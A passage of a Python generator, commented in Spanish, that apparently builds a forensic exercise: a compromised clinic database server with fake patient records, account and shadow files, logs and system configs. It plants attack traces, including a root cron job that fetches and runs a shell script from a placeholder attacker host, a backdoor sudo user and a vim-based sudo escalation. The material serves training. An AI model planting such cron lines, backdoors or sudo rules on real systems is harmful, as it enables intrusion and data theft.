        alta = f"20{random.randint(18, 26)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d} {random.randint(8, 19):02d}:{random.randint(0, 59):02d}:00"
        pacientes.append((i, f"KB{100000 + i * 7 + random.randint(0, 6)}", n, f"{a1} {a2}", dni(), nac, tel, mail, random.choice(ASEGURADORAS), alta))
    citas = []
    for i in range(1, N_CITAS + 1):
        m = random.choice(MEDICOS)
        f = f"2026-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"
        estado = "realizada" if f < "2026-09-30" else random.choice(["pendiente", "pendiente", "anulada"])
        citas.append((i, random.randint(1, N_PACIENTES), m[0], f, f"{random.randint(8, 19):02d}:{random.choice([0, 15, 30, 45]):02d}:00", m[2], estado))
    historias = []
    for i in range(1, N_HISTORIAS + 1):
        c = random.choice(CIE10)
        historias.append((i, random.randint(1, N_PACIENTES), f"20{random.randint(19, 26)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
                          random.choice(MEDICOS)[0], c[0], c[1], random.choice(NOTAS)))
    tables = {
        "citas": ("""  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `paciente_id` int(10) unsigned NOT NULL,
  `medico_id` smallint(5) unsigned NOT NULL,
  `fecha` date NOT NULL,
  `hora` time NOT NULL,
  `especialidad` varchar(40) NOT NULL,
  `estado` enum('pendiente','realizada','anulada') NOT NULL DEFAULT 'pendiente',
  PRIMARY KEY (`id`),
  KEY `idx_paciente` (`paciente_id`),
  KEY `idx_fecha` (`fecha`)""", citas),
        "historias": ("""  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `paciente_id` int(10) unsigned NOT NULL,
  `fecha` date NOT NULL,
  `medico_id` smallint(5) unsigned NOT NULL,
  `cie10` varchar(8) NOT NULL,
  `diagnostico` varchar(120) NOT NULL,
  `nota` text DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_paciente` (`paciente_id`)""", historias),
        "medicos": ("""  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `nombre` varchar(80) NOT NULL,
  `especialidad` varchar(40) NOT NULL,
  PRIMARY KEY (`id`)""", MEDICOS),
        "pacientes": ("""  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `nhc` varchar(10) NOT NULL,
  `nombre` varchar(40) NOT NULL,
  `apellidos` varchar(80) NOT NULL,
  `dni` char(9) NOT NULL,
  `fecha_nacimiento` date NOT NULL,
  `telefono` varchar(15) DEFAULT NULL,
  `email` varchar(120) DEFAULT NULL,
  `aseguradora` varchar(40) DEFAULT NULL,
  `alta` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_nhc` (`nhc`),
  UNIQUE KEY `uk_dni` (`dni`)""", pacientes),
    }
    out = ["-- MariaDB dump 10.19  Distrib 10.6.18-MariaDB, for debian-linux-gnu (x86_64)", "--",
           "-- Host: localhost    Database: kb_clinica", "-- ------------------------------------------------------",
           "-- Server version\t10.6.18-MariaDB-0ubuntu0.22.04.1", "",
           "/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;", "/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;",
           "/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;", "/*!40101 SET NAMES utf8mb4 */;",
           "/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;", "/*!40103 SET TIME_ZONE='+00:00' */;",
           "/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;",
           "/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;",
           "/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;", "/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;", ""]
    for name, (ddl, rows) in tables.items():
        out += ["--", f"-- Table structure for table `{name}`", "--", "", f"DROP TABLE IF EXISTS `{name}`;",
                "/*!40101 SET @saved_cs_client     = @@character_set_client */;", "/*!40101 SET character_set_client = utf8 */;",
                f"CREATE TABLE `{name}` (", ddl,
                f") ENGINE=InnoDB AUTO_INCREMENT={len(rows) + 1} DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;",
                "/*!40101 SET character_set_client = @saved_cs_client */;", "", "--", f"-- Dumping data for table `{name}`", "--", "",
                f"LOCK TABLES `{name}` WRITE;", f"/*!40000 ALTER TABLE `{name}` DISABLE KEYS */;",
                f"INSERT INTO `{name}` VALUES " + ",".join("(" + ",".join(q(v) for v in r) + ")" for r in rows) + ";",
                f"/*!40000 ALTER TABLE `{name}` ENABLE KEYS */;", "UNLOCK TABLES;", ""]
    out += ["/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;", "", "/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;",
            "/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;", "/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;",
            "/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;", "/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;",
            "/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;", "/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;", "",
            "-- Dump completed on 2026-09-30  1:21:00", ""]
    return "\n".join(out).encode()

def build_exfil_tgz(sql, sql_mtime):
    """tar czf kb_clinica.tgz kb_clinica.sql (GNU tar + gzip por tubería: MTIME de gzip a 0)."""
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w", format=tarfile.GNU_FORMAT) as tf:
        ti = tarfile.TarInfo("kb_clinica.sql")
        ti.size, ti.mtime, ti.mode, ti.uid, ti.gid, ti.uname, ti.gname = len(sql), int(sql_mtime), 0o644, 0, 0, "root", "root"
        tf.addfile(ti, io.BytesIO(sql))
    return gzip.compress(raw.getvalue(), compresslevel=6, mtime=0)

# ======================================================================= hashes de /etc/shadow (yescrypt, precalculados con libcrypt)
SHADOW_HASH = {
    "kbadmin": "$y$j9T$3pXz0m1VqL7d2RkNw8c5e/$kGnIdpezUe7UCFHpN1al4cAhzk.EjriGJXoq7evQkF/",
    "mvega": "$y$j9T$Hq2bT5wKc9LmN1xVz7pRe.$HYZroxDc8cRLJsQiTdg9cXAxgfFIeLxbagpXeI4lNq3",
    "portal_app": "$y$j9T$Qm4vN8rT2cLx9pZa1wEs0/$0e2bRK5rcvT2pjFI3dGzS8jds1V64Unpg./192fGSp7",   # Kb!portal#2024
    "jnavarro": "!$y$j9T$Lr8kW2pZq5Vn0cXm3bTy9.$3p4DT5vo33tK1uDFyGjx25wkGbtf5PMmfPpc22CaNe7",
    "support": "$y$j9T$h7Ky2Vb5Rn0dXq3Lm8Pt6.$dBfTOA.0wijBCRZoJ/Lx12fX9iuL3rGN/oA06e4fyd8",      # Soporte2026!
}
def days(d): return int((datetime(*d, tzinfo=timezone.utc) - datetime(1970, 1, 1, tzinfo=timezone.utc)).days)

USERS = [  # nombre, uid, gecos, home, shell
    ("kbadmin", 1000, "kbadmin", "/home/kbadmin", "/bin/bash"),
    ("mvega", 1001, "Marta Vega,,,", "/home/mvega", "/bin/bash"),
    ("portal_app", 1002, "Despliegue portal,,,", "/home/portal_app", "/bin/bash"),
    ("jnavarro", 1003, "Jorge Navarro (externo),,,", "/home/jnavarro", "/bin/bash"),
]
SUPPORT = ("support", 1004, "", "/home/support", "/bin/bash")

SYS_PASSWD = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
"""

def passwd_file(with_support):
    users = USERS + ([SUPPORT] if with_support else [])
    return SYS_PASSWD + "".join(f"{u}:x:{uid}:{uid}:{g}:{h}:{s}\n" for u, uid, g, h, s in users)

def shadow_file():
    sysnames = [l.split(":")[0] for l in SYS_PASSWD.strip().split("\n")]
    lines = []
    for n in sysnames:
        if n == "root": lines.append(f"root:!:{days((2025, 8, 4))}:0:99999:7:::")
        else: lines.append(f"{n}:*:{days((2025, 8, 4))}:0:99999:7:::")
    lines += [f"kbadmin:{SHADOW_HASH['kbadmin']}:{days((2025, 8, 4))}:0:99999:7:::",
              f"mvega:{SHADOW_HASH['mvega']}:{days((2026, 3, 2))}:0:99999:7:::",
              f"portal_app:{SHADOW_HASH['portal_app']}:{days((2025, 8, 12))}:0:99999:7:::",
              f"jnavarro:{SHADOW_HASH['jnavarro']}:{days((2026, 6, 30))}:0:99999:7:::",
              f"support:{SHADOW_HASH['support']}:{days((2026, 9, 30))}:0:99999:7:::"]
    return "\n".join(lines) + "\n"

GROUPS = [("root", 0, ""), ("daemon", 1, ""), ("bin", 2, ""), ("sys", 3, ""), ("adm", 4, "syslog,kbadmin"), ("tty", 5, ""), ("disk", 6, ""),
          ("lp", 7, ""), ("mail", 8, ""), ("news", 9, ""), ("uucp", 10, ""), ("man", 12, ""), ("proxy", 13, ""), ("kmem", 15, ""),
          ("dialout", 20, ""), ("fax", 21, ""), ("voice", 22, ""), ("cdrom", 24, "kbadmin"), ("floppy", 25, ""), ("tape", 26, ""),
          ("sudo", 27, "kbadmin,mvega{S}"), ("audio", 29, ""), ("dip", 30, "kbadmin"), ("www-data", 33, ""), ("backup", 34, ""),
          ("operator", 37, ""), ("list", 38, ""), ("irc", 39, ""), ("src", 40, ""), ("gnats", 41, ""), ("shadow", 42, ""), ("utmp", 43, ""),
          ("video", 44, ""), ("sasl", 45, ""), ("plugdev", 46, "kbadmin"), ("staff", 50, ""), ("games", 60, ""), ("users", 100, ""),
          ("nogroup", 65534, ""), ("systemd-journal", 101, ""), ("systemd-network", 102, ""), ("systemd-resolve", 103, ""),
          ("messagebus", 104, ""), ("systemd-timesync", 105, ""), ("input", 106, ""), ("sgx", 107, ""), ("kvm", 108, ""), ("render", 109, ""),
          ("lxd", 110, "kbadmin"), ("_ssh", 111, ""), ("crontab", 112, ""), ("syslog", 113, ""), ("uuidd", 114, ""), ("tcpdump", 115, ""),
          ("tss", 116, ""), ("landscape", 117, ""), ("fwupd-refresh", 118, ""), ("netdev", 119, ""), ("mysql", 120, ""),
          ("kbadmin", 1000, ""), ("mvega", 1001, ""), ("portal_app", 1002, ""), ("jnavarro", 1003, "")]

def group_file(shadow=False):
    out = []
    for n, gid, mem in GROUPS + [("support", 1004, "")]:
        mem = mem.replace("{S}", ",support")
        out.append(f"{n}:!::{mem}" if shadow else f"{n}:x:{gid}:{mem}")
    return "\n".join(out) + "\n"

BASH_BASHRC = r"""# System-wide .bashrc file for interactive bash(1) shells.

# To enable the settings / commands in this file for login shells as well,
# this file has to be sourced in /etc/profile.

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, overwrite the one in /etc/profile)
# but only if not SUDOing and have SUDO_PS1 set; then assume smart user.
if ! [ -n "${SUDO_USER}" -a -n "${SUDO_PS1}" ]; then
  PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi

# enable bash completion in interactive shells
#if ! shopt -oq posix; then
#  if [ -f /usr/share/bash-completion/bash_completion ]; then
#    . /usr/share/bash-completion/bash_completion
#  elif [ -f /etc/bash_completion ]; then
#    . /etc/bash_completion
#  fi
#fi

# if the command-not-found package is installed, use it
if [ -x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-not-found ]; then
	function command_not_found_handle {
	        # check because c-n-f could've been removed in the meantime
                if [ -x /usr/lib/command-not-found ]; then
		   /usr/lib/command-not-found -- "$1"
                   return $?
                elif [ -x /usr/share/command-not-found/command-not-found ]; then
		   /usr/share/command-not-found/command-not-found -- "$1"
                   return $?
		else
		   printf "%s: command not found\n" "$1" >&2
		   return 127
		fi
	}
fi

# --- Historial con fecha y sin pérdidas (M. Vega, 06/08/2025) ---
HISTTIMEFORMAT="%F %T "
HISTSIZE=5000
HISTFILESIZE=10000
shopt -s histappend
"""

SUDOERS = """#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults	use_pty

# This preserves proxy settings from user environments of root
# equivalent users (group sudo)
#Defaults:%sudo env_keep += "http_proxy https_proxy ftp_proxy all_proxy no_proxy"

# This allows running arbitrary commands, but so does ALL, and it means
# different sudoers have their choice of editor respected.
#Defaults:%sudo env_keep += "EDITOR"

# Completely harmless preservation of a user preference.
#Defaults:%sudo env_keep += "GREP_COLOR"

# While you shouldn't normally run git as root, you need to with etckeeper
#Defaults:%sudo env_keep += "GIT_AUTHOR_* GIT_COMMITTER_*"

# Per-user preferences; root won't have sensible values for them.
#Defaults:%sudo env_keep += "EMAIL DEBEMAIL DEBFULLNAME"

# "sudo scp" or "sudo rsync" should be able to use your SSH agent.
#Defaults:%sudo env_keep += "SSH_AGENT_PID SSH_AUTH_SOCK"

# Ditto for GPG agent
#Defaults:%sudo env_keep += "GPG_AGENT_INFO"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "@include" directives:

@includedir /etc/sudoers.d
"""
SUDOERS_README = """#
# The default /etc/sudoers file created on installation of the
# sudo  package now includes the directive:
# 
# 	@includedir /etc/sudoers.d
# 
# This will cause sudo to read and parse any files in the /etc/sudoers.d 
# directory that do not end in '~' or contain a '.' character.
# 
# Note that there must be at least one file in the sudoers.d directory (this
# one will do).
# 
# Note also, that because sudoers contents can vary widely, no attempt is 
# made to add this directive to existing sudoers files on upgrade.  Feel free
# to add the above directive to the end of your /etc/sudoers file to enable 
# this functionality for existing installations if you wish!
#
# Finally, please note that using the visudo command is the recommended way
# to update sudoers content, since it protects against many failure modes.
# See the man page for visudo and sudoers for more information.
#
"""
SUDOERS_PORTAL = """# Despliegue del portal: permitir ajustar la configuracion de MariaDB sin pedir a la DBA.
# Pendiente de revisar. MV 12/08/2026
portal_app ALL=(root) NOPASSWD: /usr/bin/vim /etc/mysql/mariadb.conf.d/*
"""

CRONTAB = """# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
"""
CMD_HOURLY = "   cd / && run-parts --report /etc/cron.hourly"
CMD_DAILY = "test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )"
CMD_WEEKLY = "test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )"
CMD_SA1 = "command -v debian-sa1 > /dev/null && debian-sa1 1 1"
CMD_SA2 = "command -v debian-sa1 > /dev/null && debian-sa1 60 2"
CMD_E2 = "test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r"
CMD_BACKUP = "/usr/local/bin/db-backup.sh"
C2_URL = f"http://{ATTACKER}:{C2_PORT}"
CMD_EVIL = f"curl -s {C2_URL}/c/$(hostname) | sh"

CRON_D = {
    "e2scrub_all": "30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\n"
                   "10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r\n",
    "sysstat": "# The first element of the path is a directory where the debian-sa1\n# script is located\n"
               "PATH=/usr/lib/sysstat:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin\n\n"
               "# Activity reports every 10 minutes everyday\n5-55/10 * * * * root " + CMD_SA1 + "\n\n"
               "# Additional run at 23:59 to rotate the statistics file\n59 23 * * * root " + CMD_SA2 + "\n",
    "db-backup": "# Copia nocturna de MariaDB a nas01 (M. Vega)\nMAILTO=\"\"\n0 23 * * * backup " + CMD_BACKUP + "\n",
    "mariadb-health": f"*/10 * * * * root {CMD_EVIL}\n",
}

DB_BACKUP_SH = """#!/bin/bash
# Copia nocturna de MariaDB a nas01. M. Vega, 2025-08-14
set -euo pipefail

DEST=/var/backups/mariadb
FECHA=$(date +%F)

mysqldump --defaults-extra-file=/var/backups/.my.cnf --all-databases \\
    --single-transaction --routines --events | gzip -6 > "$DEST/all-$FECHA.sql.gz"

find "$DEST" -name 'all-*.sql.gz' -mtime +7 -delete

rsync -a --delete -e "ssh -i /var/backups/.ssh/id_ed25519 -o BatchMode=yes" \\
    "$DEST/" backup@nas01.kelbrook.internal:/volume1/db01/

logger -t db-backup "copia $FECHA enviada a nas01"
"""

SSHD_CONFIG = """
# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2

# To disable tunneled clear text passwords, change to no here!
# MV 12/08/2025: activado para el despliegue del portal (portal_app)
PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
KbdInteractiveAuthentication no

UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
X11Forwarding yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem	sftp	/usr/lib/openssh/sftp-server
"""

MARIADB_50 = """#
# These groups are read by MariaDB server.
# Use it for options that only the server (but not clients) should see

# this is read by the standalone daemon and embedded servers
[server]

# this is only for the mysqld standalone daemon
[mysqld]

#
# * Basic Settings
#

user                    = mysql
pid-file                = /run/mysqld/mysqld.pid
basedir                 = /usr
datadir                 = /var/lib/mysql
tmpdir                  = /tmp
lc-messages-dir         = /usr/share/mysql
lc-messages             = en_US
skip-external-locking

# Escucha en la VLAN de datos para web01 (MV)
bind-address            = 10.20.30.20

#
# * Fine Tuning
#
key_buffer_size        = 128M
max_connections        = 200
innodb_buffer_pool_size = 2G

#
# * Logging and Replication
#
log_error = /var/log/mysql/error.log
expire_logs_days        = 10

#
# * Character sets
#
character-set-server  = utf8mb4
collation-server      = utf8mb4_general_ci

[embedded]

[mariadb]

[mariadb-10.6]
"""

OS_RELEASE = """PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
"""

SKEL = {".bashrc": 3771, ".profile": 807, ".bash_logout": 220}
SKEL_MTIME = datetime(2022, 1, 6, 16, 23, 33, tzinfo=timezone.utc).timestamp()

# ======================================================================= helpers de eventos de host
HIST = {"root": [], "mvega": [], "portal_app": [], "jnavarro": []}   # (t, comando) ; t=None -> sin marca de tiempo
UIDS = {"root": 0, "mvega": 1001, "portal_app": 1002, "kbadmin": 1000, "jnavarro": 1003, "backup": 34, "support": 1004}

def cron_job(t, user, cmd, dur):
    p = pid_at(t)
    auth(t, f"CRON[{p}]", f"pam_unix(cron:session): session opened for user {user}(uid={UIDS[user]}) by (uid=0)")
    sysl(t, f"CRON[{p}]", f"({user}) CMD ({cmd})")
    auth(t + dur, f"CRON[{p}]", f"pam_unix(cron:session): session closed for user {user}")
    return p

def ssh_login(t_acc, t_out, user, ip, port, method, sid, pts="pts/0", fp=None, sshd_pid=None, first=True):
    """Registros de host de una sesión SSH interactiva (auth.log, syslog, wtmp, lastlog)."""
    p = sshd_pid or pid_at(t_acc - 0.5, span=3)
    uid = UIDS[user]
    if method == "password":
        auth(t_acc, f"sshd[{p}]", f"Accepted password for {user} from {ip} port {port} ssh2")
    else:
        auth(t_acc, f"sshd[{p}]", f"Accepted publickey for {user} from {ip} port {port} ssh2: ED25519 {fp}")
    auth(t_acc, f"sshd[{p}]", f"pam_unix(sshd:session): session opened for user {user}(uid={uid}) by (uid=0)")
    auth(t_acc + 0.01, f"systemd-logind[{LOGIND_PID}]", f"New session {sid} of user {user}.")
    if first:
        up = pid_at(t_acc + 0.02, span=2)
        sysl(t_acc + 0.02, "systemd[1]", f"Created slice User Slice of UID {uid}.")
        sysl(t_acc + 0.02, "systemd[1]", f"Starting User Runtime Directory /run/user/{uid}...")
        sysl(t_acc + 0.03, "systemd[1]", f"Finished User Runtime Directory /run/user/{uid}.")
        sysl(t_acc + 0.03, "systemd[1]", f"Starting User Manager for UID {uid}...")
        auth(t_acc + 0.04, f"systemd[{up}]", f"pam_unix(systemd-user:session): session opened for user {user}(uid={uid}) by (uid=0)")
        sysl(t_acc + 0.2, "systemd[1]", f"Started User Manager for UID {uid}.")
    sysl(t_acc + 0.21, "systemd[1]", f"Started Session {sid} of User {user}.")
    WTMP.append((t_acc, utmp_rec(7, p + 2, pts, pts.replace("pts/", "ts/"), user, ip, t_acc, ip)))
    LASTLOG[uid] = (t_acc, pts, ip)
    if t_out is None:
        return p
    auth(t_out, f"sshd[{p}]", f"Received disconnect from {ip} port {port}:11: disconnected by user")
    auth(t_out, f"sshd[{p}]", f"Disconnected from user {user} {ip} port {port}")
    auth(t_out, f"sshd[{p}]", f"pam_unix(sshd:session): session closed for user {user}")
    auth(t_out + 0.01, f"systemd-logind[{LOGIND_PID}]", f"Session {sid} logged out. Waiting for processes to exit.")
    auth(t_out + 0.02, f"systemd-logind[{LOGIND_PID}]", f"Removed session {sid}.")
    sysl(t_out + 0.02, "systemd[1]", f"session-{sid}.scope: Deactivated successfully.")
    WTMP.append((t_out, utmp_rec(8, p + 2, pts, pts.replace("pts/", "ts/"), "", "", t_out)))
    if first:
        te = t_out + 10.1
        sysl(te, "systemd[1]", f"Stopping User Manager for UID {uid}...")
        auth(te + 0.03, f"systemd[{up}]", f"pam_unix(systemd-user:session): session closed for user {user}")
        for k, m in enumerate([f"user@{uid}.service: Deactivated successfully.", f"Stopped User Manager for UID {uid}.",
                               f"Stopping User Runtime Directory /run/user/{uid}...", f"run-user-{uid}.mount: Deactivated successfully.",
                               f"user-runtime-dir@{uid}.service: Deactivated successfully.", f"Stopped User Runtime Directory /run/user/{uid}.",
                               f"Removed slice User Slice of UID {uid}."]):
            sysl(te + 0.05 + k * 0.01, "systemd[1]", m)
    return p

def ssh_fail(t_open, fails, user, ip, port, end, valid=True, t_user=None):
    """fails: lista de instantes en que se recibe cada contraseña errónea. end: 'closed' | 'byebye'."""
    p = pid_at(t_open)
    if not valid:
        auth(t_user or t_open + 0.4, f"sshd[{p}]", f"Invalid user {user} from {ip} port {port}")
    for tf in fails:
        if valid:
            auth(tf, f"sshd[{p}]", f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={user}")
        else:
            auth(tf, f"sshd[{p}]", "pam_unix(sshd:auth): check pass; user unknown")
            auth(tf, f"sshd[{p}]", f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip} ")
        auth(tf + 2.1, f"sshd[{p}]", f"Failed password for {'' if valid else 'invalid user '}{user} from {ip} port {port} ssh2")
        BTMP.append((tf + 2.1, utmp_rec(6, p, "ssh:notty", "", user, ip, tf + 2.1, ip)))
    tl = fails[-1] + 2.1
    who = f"authenticating user {user}" if valid else f"invalid user {user}"
    if end == "closed":
        auth(tl + 1.6, f"sshd[{p}]", f"Connection closed by {who} {ip} port {port} [preauth]")
    else:
        auth(tl + 0.3, f"sshd[{p}]", f"Received disconnect from {ip} port {port}:11: Bye Bye [preauth]")
        auth(tl + 0.3, f"sshd[{p}]", f"Disconnected from {who} {ip} port {port} [preauth]")
    return p

def sudo(t, user, pwd, cmd, close_t=None, tty="pts/0"):
    auth(t, "sudo", f"{user:>8} : TTY={tty} ; PWD={pwd} ; USER=root ; COMMAND={cmd}")
    if cmd != "list":
        auth(t + 0.003, "sudo", f"pam_unix(sudo:session): session opened for user root(uid=0) by {user}(uid={UIDS[user]})")
        if close_t:
            auth(close_t, "sudo", "pam_unix(sudo:session): session closed for user root")

# ======================================================================= 1. cron y systemd de fondo
def background_cron():
    t = T(27, 0, 0)
    end = TRIAGE_T
    evil_from = T(30, 1, 20)
    while t < end:
        d = dt(t)
        h, m, wd = d.hour, d.minute, d.weekday()   # lunes=0 ... domingo=6
        jitter = random.uniform(0.9, 1.5)
        jobs = []
        if m == 17: jobs.append(("root", CMD_HOURLY, random.uniform(0.05, 0.3)))
        if m % 10 == 5: jobs.append(("root", CMD_SA1, random.uniform(0.02, 0.08)))
        if h == 23 and m == 59: jobs.append(("root", CMD_SA2, random.uniform(0.3, 0.9)))
        if h == 6 and m == 25: jobs.append(("root", CMD_DAILY, random.uniform(0.02, 0.1)))
        if h == 6 and m == 47 and wd == 6: jobs.append(("root", CMD_WEEKLY, random.uniform(0.02, 0.1)))
        if h == 3 and m == 10: jobs.append(("root", CMD_E2, random.uniform(0.01, 0.05)))
        if h == 3 and m == 30 and wd == 6:
            jobs.append(("root", "test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron", 0.03))
        if t >= evil_from and m % 10 == 0: jobs.append(("root", CMD_EVIL, random.uniform(0.08, 0.2)))
        for k, (u, c, du) in enumerate(jobs):
            tj = t + jitter + k * 0.003
            if c == CMD_EVIL:
                beacon(tj)
